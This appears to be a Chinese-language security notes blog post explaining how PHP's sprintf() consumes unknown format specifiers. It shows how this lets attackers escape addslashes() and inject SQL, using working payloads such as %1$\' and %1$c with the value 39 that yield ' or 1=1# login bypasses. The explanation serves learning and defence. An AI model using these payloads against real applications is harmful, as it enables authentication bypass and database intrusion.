---
layout: post
title: sprintf()格式化字符串注入
data: 2019-11-23
categories: 
 - Notes
 - Notes-Injection
tags: 
 - Injection
description:
excerpt_separator: ""
---

# sprintf()函数

和其它语言的格式化字符串函数类似，sprintf()的语法为：

```
sprintf ( string $format [, mixed $... ] ) : string
```

例如：

```php
<?php
    echo sprintf("select * from user where username='%s'\n", "admin");
?>
```

运行结果：

````
select * from user where username=admin
````

# 漏洞原理

在PHP的底层代码中，会对`$format`中`%`符号后的第一个字符做一个switch判断，以实现格式化输入功能。但这个判断仅15个case，换言之在`%`符号之后且超出了判断范围的字符都会被“吃掉”。

这样的话，如果我们上传的Payload被addslashes()处理过，就可以利用这个特性使被转义的字符逃逸。

# 利用方式

## 使用%

直接在危险字符前加入`%`即可。

不过需要主要的是如果当前字符串中`%`符号的数目大于sprintf()函数实际提供的参数，就会引起报错：

```php
<?php
    echo sprintf("select * from user where username='admin%\' or 1=1#' and password='%s'\n" , "pass");
?>
```

运行结果：

```
PHP Warning:  sprintf(): Too few arguments in /home/glyuan/foo.php on line 2
```

## 使用%1$

在占位符中，`%n$s`可以选择特定位置的参数：

```php
<?php
    echo sprintf("select * from user where username='%2\$s' and password='%1\$s'\n", "pass", "admin");
?>
```

运行结果：

```
select * from user where username='admin' and password='pass'
```

所以用`%1$`代替`%`可以规避之前的报错：

```php
<?php
    echo sprintf("select * from user where username='admin%1\$\' or 1=1#' and password='%s'\n" , "pass");
?>
```

运行结果：

```
select * from user where username='admin' Or 1=1#' and password='pass'
```

## 使用%c

`%c`是单个字符的占位符，接受一个整数，并根据ASCII码转化为字符，可以利用这个特性传入单引号等危险字符，以绕过过滤：

```php
<?php
    $username = "admin%1\$c or 1=1#";
	$password = "39";
	$sql = "select * from user where username='$username' and password='%s'\n";
	echo sprintf($sql, $password);
?>
```

运行结果：

```
select * from user where username='admin' or 1=1#' and password='39'
```

